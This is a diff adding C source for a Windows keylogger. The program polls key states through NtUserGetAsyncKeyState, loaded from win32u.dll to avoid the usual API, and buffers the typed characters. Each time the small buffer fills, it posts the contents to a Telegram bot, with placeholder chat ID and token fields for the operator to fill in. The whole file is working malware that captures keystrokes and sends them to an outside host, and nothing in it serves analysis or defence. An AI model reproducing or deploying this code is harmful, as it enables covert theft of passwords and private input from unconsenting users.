@@ -1,0 +1,160 @@
+#define _CRT_SECURE_NO_WARNINGS
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
+
+#define BUFFER_SIZE 20 // size of the buffer for keystrokes
+
+// https://doxygen.reactos.org/d4/d49/win32ss_2user_2ntuser_2keyboard_8c.html#ab695305553e9ff550bcefb0e5acec9de
+extern SHORT NtUserGetAsyncKeyState(
+    IN      INT     vKey
+);
+
+char* keystrokes = NULL;
+size_t keystrokesSize = 0;
+
+int sendToTgBot(const char* message) {
+    const char* chatId = "{CHAT-ID}"; // Change this to your chat ID
+    HINTERNET hSession = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+    BOOL bResults = FALSE;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    DWORD dwStatusCode = 0;
+    DWORD dwStatusSize = sizeof(dwStatusCode);
+
+    hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hSession == NULL) {
+        fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
+        return 1;
+    }
+
+    hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (hConnect == NULL) {
+        fprintf(stderr, "WinHttpConnect. Error: %d has occurred.\n", GetLastError());
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+
+    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot{API}/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (hRequest == NULL) {
+        fprintf(stderr, "WinHttpOpenRequest. Error: %d has occurred.\n", GetLastError());
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+
+    // Construct the request body
+    char requestBody[BUFFER_SIZE + 100];
+    sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);
+
+    // Set the headers
+    bResults = WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0);
+    if (!bResults) {
+        fprintf(stderr, "WinHttpSendRequest. Error: %d has occurred.\n", GetLastError());
+    }
+    else {
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+        if (!bResults) {
+            fprintf(stderr, "WinHttpReceiveResponse. Error: %d has occurred.\n", GetLastError());
+        }
+        else {
+            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwStatusSize, NULL);
+            if (dwStatusCode == 200) {
+                printf("Successfully sent to Telegram bot :)\n");
+            }
+            else {
+                printf("Failed to send to Telegram bot. HTTP Status Code: %d\n", dwStatusCode);
+            }
+        }
+    }
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return bResults ? 0 : 1;
+}
+
+void appendToKeystrokes(char character) {
+    if (keystrokesSize + 1 >= BUFFER_SIZE) {
+        // Buffer is full, send it to the bot and reset
+        sendToTgBot(keystrokes);
+        keystrokesSize = 0;
+        keystrokes[0] = '\0';
+    }
+
+    keystrokes[keystrokesSize++] = character;
+    keystrokes[keystrokesSize] = '\0'; // Null-terminate the string
+}
+
+VOID KeyboardClicksLogger() {
+    SHORT state = NULL;
+
+    if (LoadLibraryA("WIN32U.DLL") == NULL) {
+        printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
+        return;
+    }
+
+    printf("[*] Output: ");
+
+    while (TRUE) {
+        Sleep(10);
+
+        for (int i = 33; i < 255; i++) {
+            state = (SHORT)NtUserGetAsyncKeyState((DWORD)i);
+
+            if (state == 1 || state == -32767) {
+                if ((7 < i) && (120 < i || i < 143)) {
+                    printf("\\x%02X", i);
+                    appendToKeystrokes((char)i);
+                }
+            }
+        }
+
+        // Handle space and enter keys separately
+        state = (SHORT)NtUserGetAsyncKeyState(VK_SPACE);
+        if (state == 1 || state == -32767) {
+            printf(" ");
+            appendToKeystrokes(' ');
+        }
+
+        state = (SHORT)NtUserGetAsyncKeyState(VK_RETURN);
+        if (state == 1 || state == -32767) {
+            printf("\n");
+            appendToKeystrokes('\n');
+        }
+    }
+
+    return;
+}
+
+int main() {
+    HANDLE hThread = NULL;
+    DWORD dwThreadId = NULL;
+
+    keystrokes = (char*)malloc(BUFFER_SIZE);
+    if (keystrokes == NULL) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return 1;
+    }
+    keystrokes[0] = '\0';
+
+    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
+    if (hThread) {
+        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks\n", dwThreadId);
+        WaitForSingleObject(hThread, INFINITE);
+    }
+
+    if (keystrokes != NULL) {
+        free(keystrokes);
+    }
+
+    return 0;
+}
